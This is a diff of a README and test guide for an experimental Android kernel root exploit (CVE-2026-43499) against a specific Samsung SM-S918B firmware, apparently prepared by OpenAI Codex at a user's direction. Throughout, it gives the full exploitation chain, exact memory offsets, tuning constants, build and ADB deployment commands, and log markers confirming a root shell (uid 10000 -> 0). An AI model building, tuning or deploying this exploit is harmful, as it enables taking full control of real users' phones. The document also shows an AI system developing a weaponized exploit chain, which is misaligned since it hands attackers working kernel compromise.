@@ -1,8 +1,9 @@
 # SM-S918B / S918BXXSAFZF5 experimental payload
 
-> **AI disclosure:** OpenAI Codex prepared this port, QEMU validation record,
-> and test guide under `@johnny-salz`'s direction. QEMU tests were automated.
-> The complete payload has not yet been validated on a real SM-S918B FZF5.
+> **AI disclosure:** OpenAI Codex recovered and implemented this route, prepared
+> the QEMU validation record, and wrote this test guide under `@johnny-salz`'s
+> direction. The open rebuild has completed the whole chain on the exact FZF5
+> kernel in QEMU. It still needs validation on a real SM-S918B FZF5.
 
 This is an experimental payload for this exact target:
 
@@ -23,65 +24,69 @@ candidates, not a released support-feed entry.
 
 ## What changed
 
-The app payload now has one shared fake `rt_mutex_waiter` builder and two
-selectable stack-writer backends:
+The default build now follows the recovered 131072-byte hardware-working
+engine:
 
 ```text
-rootless P0 fingerprint and KernelSnitch
-  -> controlled complete mm_struct slab group
-  -> deterministic 24-slab drain
-  -> SKB reclaim
-  -> MCAST or SIGRETURN writes the same fake waiter
+tracefs sched_blocked_reason KASLR leak
+  -> KernelSnitch locates a live mm_struct/order-3 slab
+  -> recovered 16+16 Samsung SLUB drain
+  -> 0x8e80 AF_UNIX SKB reclaim
+  -> rt_sigreturn/FPSIMD writes a compact fake waiter
   -> ashmem fops replacement
-  -> configfs arbitrary read/write
-  -> pipe physical read/write
+  -> mandatory configfs CFI read/write gate
+  -> second KernelSnitch/SKB page
+  -> verified pipe physical read/write
   -> kernel usermode-helper root stage
 ```
 
-- `mcast` copies a native 264-byte `group_source_req`. Real-device trace and
-  disassembly place the waiter at `buffer + 0x40`. The `setsockopt` call must be
-  the last syscall made by that worker before the stale waiter is consumed.
-- `sigreturn` copies the waiter through the signal frame. It detects the
-  signal-frame layout and uses `FPSIMD + 0x18` without SVE or `SVE + 0x28` when
-  SVE is active.
+- `sigreturn` is the default and recovered production writer. It copies a full
+  0x200-byte FPSIMD image and puts the waiter at `FPSIMD + 0x18` on the exact
+  no-SVE route. The open code also recognizes an SVE record and can use
+  `SVE + 0x28`, but that extension is not yet counted as validated.
+- `mcast` remains selectable for comparison with the earlier PR #196 route. It
+  is not part of the recovered hardware-working engine.
+- Each reclaim write is exactly `0x8e80`: a `0xe80` linear SKB head followed by
+  one `0x8000` order-3 fragment. The fake fops, lock, waiter, and task land at
+  page offsets `0x1180`, `0x1390`, `0x14d0`, and `0x2380`.
+- The fops writer runs immediately after the first reclaim. The second page
+  search starts only after the new configfs ARW passes its 35-byte write/read
+  gate. Reversing those stages loses the reclaimed fops page.
 
-The production payload does not use tracefs, `perf_event_open`, or a QEMU
-oracle. Pselect is not a writer backend for this target.
+The production payload uses tracefs for the slide. It does not use
+`perf_event_open`, a supplied page address, or a QEMU oracle. `boot_id` is an
+identity value, not the KASLR leak. Pselect is not a writer backend for this
+target.
 
-## Ready-built test payloads
+## Test payload status
 
-| Backend | File | SHA-256 | Size |
-| --- | --- | --- | --- |
-| MCAST | `artifacts/dm3q-S918BXXSAFZF5/cve-2026-43499-app.so` | `63076e77cf73d24e7314ad52611594726a61a282e08669c7e2822faf0c3b7c7c` | 104128 bytes |
-| SIGRETURN | `artifacts/dm3q-S918BXXSAFZF5/cve-2026-43499-app-sigreturn.so` | `b8f63805c15a0f5276fb451e2e836cdb3653d6fe088e394ececb4e1d23516c38` | 104128 bytes |
+The tracked artifacts from the earlier PR #196 experiment do not contain this
+recovered route. Do not use their old hashes to test the code described here.
+Build a fresh payload from this branch and record its SHA-256 with the log. No
+new generated artifact is included by this source change.
 
-Verify the hash before each test so the log can be tied to the right backend.
-
-## Build both variants
+## Build the recovered route
 
 An Android NDK with an `aarch64-linux-android35-clang` toolchain is required.
-The commands below keep the two outputs separate:
+The default for this target is now SIGRETURN:
 
 ```sh
 make TARGET=dm3q-S918BXXSAFZF5 \
-  STACK_WRITER=mcast \
-  OUTDIR=build/dm3q-S918BXXSAFZF5-mcast \
-  ANDROID_NDK_HOME=/path/to/android-ndk \
-  release
-
-make TARGET=dm3q-S918BXXSAFZF5 \
   STACK_WRITER=sigreturn \
-  OUTDIR=build/dm3q-S918BXXSAFZF5-sigreturn \
+  OUTDIR=build/dm3q-S918BXXSAFZF5-closed \
   ANDROID_NDK_HOME=/path/to/android-ndk \
-  release
+  all release
 ```
 
-The results are:
+The main results are:
 
 ```text
-build/dm3q-S918BXXSAFZF5-mcast/cve-2026-43499-app.release.so
-build/dm3q-S918BXXSAFZF5-sigreturn/cve-2026-43499-app.release.so
+build/dm3q-S918BXXSAFZF5-closed/cve-2026-43499-app.so
+build/dm3q-S918BXXSAFZF5-closed/cve-2026-43499-app.release.so
+build/dm3q-S918BXXSAFZF5-closed/cve-2026-43499-root
 ```
+
+`STACK_WRITER=mcast` remains available only for an explicit legacy comparison.
 
 ## Fast ADB shell test without an APK
 
@@ -94,14 +99,13 @@ Build the selected payload and its loader in one command:
 
 ```sh
 make TARGET=dm3q-S918BXXSAFZF5 \
-  STACK_WRITER=mcast \
+  STACK_WRITER=sigreturn \
   OUTDIR=build/dm3q-fzf5-shell \
   ANDROID_NDK_HOME=/path/to/android-ndk \
   shell-bundle
 ```
 
-Use `STACK_WRITER=sigreturn` instead to test the backup. The two files needed
-on the phone are:
+The two files needed on the phone are:
 
 ```text
 build/dm3q-fzf5-shell/cve-2026-43499-app.release.so
@@ -154,31 +158,15 @@ $assetDir = Join-Path $appRepo 'app\src\main\assets\payloads\dm3q-S9180ZHS8FZF5'
 New-Item -ItemType Directory -Force $assetDir | Out-Null
 ```
 
-### MCAST test
+Build the recovered SIGRETURN route, then copy its fresh result into the local
+app asset slot:
 
 ```powershell
 Copy-Item -Force `
-  (Join-Path $payloadRepo 'artifacts\dm3q-S918BXXSAFZF5\cve-2026-43499-app.so') `
+  (Join-Path $payloadRepo 'build\dm3q-S918BXXSAFZF5-closed\cve-2026-43499-app.release.so') `
   (Join-Path $assetDir 'cve-2026-43499-app.so')
 Get-FileHash (Join-Path $assetDir 'cve-2026-43499-app.so') -Algorithm SHA256
 ```
-
-The hash must be
-`63076e77cf73d24e7314ad52611594726a61a282e08669c7e2822faf0c3b7c7c`.
-
-### SIGRETURN test
-
-Replace the same canonical app asset with the backup backend:
-
-```powershell
-Copy-Item -Force `
-  (Join-Path $payloadRepo 'artifacts\dm3q-S918BXXSAFZF5\cve-2026-43499-app-sigreturn.so') `
-  (Join-Path $assetDir 'cve-2026-43499-app.so')
-Get-FileHash (Join-Path $assetDir 'cve-2026-43499-app.so') -Algorithm SHA256
-```
-
-The hash must be
-`b8f63805c15a0f5276fb451e2e836cdb3653d6fe088e394ececb4e1d23516c38`.
 
 After selecting one backend, build and install the debug APK:
 
@@ -228,17 +216,16 @@ payload SHA-256, full exploit log, full logcat, and any pstore/last-kmsg data.
 The key success markers are:
 
 ```text
-build config ... stack_writer=mcast|sigreturn
-controlled mm group full
-controlled mm group selected
-controlled mm trigger ready
-controlled skb reclaim
+build config ... stack_writer=sigreturn
+slide-kaslr-ok source=tracefs
+mm leaked=... base=... object_index=...
+sk_buff reclaim sends=.../64 mode=0
 kernel page prepare
-slide mcast returned offset=0x40 ... sched_ok=1
-slide sigreturn returned offset=0x18|0x28 ... fpsimd=1 sve=0|1 ... sched_ok=1
+slide sigreturn returned offset=0x18 ... fpsimd=1 sve=0 ... sched_ok=1
 p0 physical write status=0 ok=1
 cfi write ret=35
 cfi read ret=35
+fresh physrw pipe after verified fops page=...
 phys step pipe probe found=1
 phys step probed read done ok=1
 phys step probed write done ok=1
@@ -257,22 +244,17 @@ All compile-time values below are in
 
 | Parameter | Default | What it controls / what to inspect |
 | --- | ---: | --- |
-| `S918_PAGE_SCAN_MAX` | 256 | Maximum pages checked by the P0 fingerprint search. Raise only if logs exhaust the scan without a fingerprint match. |
-| `S918_KSNITCH_HINT_COLLISIONS` | 2 | Cheap KernelSnitch prefilter. False negatives here mean the full test never runs. |
-| `S918_KSNITCH_FULL_COLLISIONS` | 5 | Strong KernelSnitch acceptance count. Lower values admit more false candidates; higher values can reject a noisy but real candidate. |
-| `APPENDED_FUTEXES` | 2048 | KernelSnitch collision amplifier size. More work costs memory and time. |
-| `REPEAT_MEASUREMENT` | 64 | Repeats per timing sample. Raise when candidate timings overlap baseline noise. |
+| `APPENDED_FUTEXES` | 4096 | KernelSnitch collision amplifier size recovered from the closed route. More work costs memory and time. |
+| `REPEAT_MEASUREMENT` | 128 | Repeats per timing sample recovered from the closed route. |
 | `AVERAGE` | 8 | Timing aggregate count. Inspect the printed baseline and candidate spread before changing it. |
 | `KERNELSNITCH_BASELINE_SAMPLES` | 8 | Baseline sample count. |
 | `KERNELSNITCH_BASELINE_QUANTILE` | 1 | Baseline quantile index. |
-| `S918_DMA32_SKIP_SLABS` | 8 | Complete mm_struct slabs skipped before selecting the controlled group. Change only when logs show the group in the wrong physical zone. |
-| `S918_TRIGGER_SLABS` | 24 | Full slabs used to force the Samsung SLUB drain. Reduce only if the log proves discard; raise if the selected slab stays frozen. |
-| `S918_SKB_SENDS` | 256 | SKB reclaim sends. Raise if drain succeeds but reclaim never confirms. |
-| `S918_SKB_SNDBUF` | 8388608 | Socket send buffer for the reclaim spray. |
-| `S918_RECLAIM_SOCKET_PAIRS` | 32 | Socket pairs retained for reclaim. More pairs trade memory for coverage. |
-| `MCAST_WAITER_OFF` | 0x40 | Real SM-S918B native MCAST stack offset. Do not tune blindly; a crash trace or disassembly must justify a change. |
+| `APP_MM_EARLY_DRAIN_TRIGGERS` | 16 | Prepare slabs drained before target release; the remaining 16 are drained after it. |
+| `SKB_SEND_SIZE` | 0x8e80 | Exact AF_UNIX send geometry: `0xe80` head plus one `0x8000` fragment. |
+| `SKB_RECLAIM_SENDS` | 64 | Maximum reclaim sends used by each page attempt. |
+| `PIPE_MAX_ATTEMPTS` | 12 | Second KernelSnitch/pipe preparation attempts. |
 | `SIGRETURN_FPSIMD_WAITER_OFF` | 0x18 | Waiter offset in the no-SVE FPSIMD record. |
-| `SIGRETURN_SVE_WAITER_OFF` | 0x28 | Waiter offset in the SVE signal record. |
+| `SIGRETURN_SVE_WAITER_OFF` | 0x28 | Experimental SVE-record offset; not part of the recovered closed route. |
 
 `SLIDE_ENTER_DELAY_USEC` (legacy alias: `PSELECT_DELAY_USEC`) controls the
 writer-entry delay. `SLIDE_P0_OFFSET` forces a per-boot offset and is unsafe if
@@ -286,25 +268,20 @@ The target was rehosted with the exact Samsung kernel image for
 `5.15.189-android13-8-33413713-abS918BXXSAFZF5` (raw Image SHA-256
 `45e16fc602498f89e8ba5ab6da3109eccf04023bb69e916ab596a903da477bfd`).
 
-With a QEMU-only exact-mm allocation oracle, the current source completed the
-full chain for:
+The authoritative current-source run is
+`boot-payload-closed-20260813-183634.log`. It supplied neither a slide nor an
+`mm_struct` address. Tracefs derived the slide and KernelSnitch supplied both
+pages. The first pass accepted 57 SKB sends, SIGRETURN used no-SVE offset
+`0x18`, configfs returned 35/35 bytes, pipe read/write/read64 passed, UMH root
+completed, and the process reported `uid=10000 -> 0` with status 0.
 
-- MCAST;
-- SIGRETURN with SVE (`waiter offset 0x28`);
-- SIGRETURN without SVE (`waiter offset 0x18`).
+The decisive implementation fix was stage order. The earlier open route found
+the pipe page before firing the fops writer, leaving the first reclaimed page
+idle for about 30 seconds. The recovered order fires and verifies the writer
+first, then starts the second KernelSnitch search.
 
-Each successful run reached configfs read/write, pipe read/write/read64, the
-kernel usermode-helper stage, and `uid=10000 -> 0`, then powered off cleanly.
-The SIGRETURN SVE run also had one earlier post-writer pipe-reclaim miss; its
-retry completed. This shows why each stage has separate log gates.
-
-The QEMU rehost's MCAST wrapper has different stack geometry and used a
-harness-only `0x78` override. It validates the MCAST backend and the rest of the
-shared chain, not the real-device `0x40` placement. The release value `0x40`
-comes from the real SM-S918B trace and matching disassembly.
-
-The active routes also completed fully rootless QEMU runs without tracefs,
-perf, or the exact-mm oracle before unrelated dead test code was removed. A
-current-source rootless retry later timed out in the KernelSnitch timing search
-without crashing. That is expected to be less deterministic under emulation;
-it is not counted as real-hardware validation.
+An SVE-enabled follow-up correctly found the SVE record and selected `+0x28`,
+but that attempt failed the reclaim-content gate and panicked on a foreign fake
+fops owner. It is not counted as validation of the SVE extension. The exact
+closed engine has no SVE branch, so the reproduced production proof is the
+full no-SVE route above.
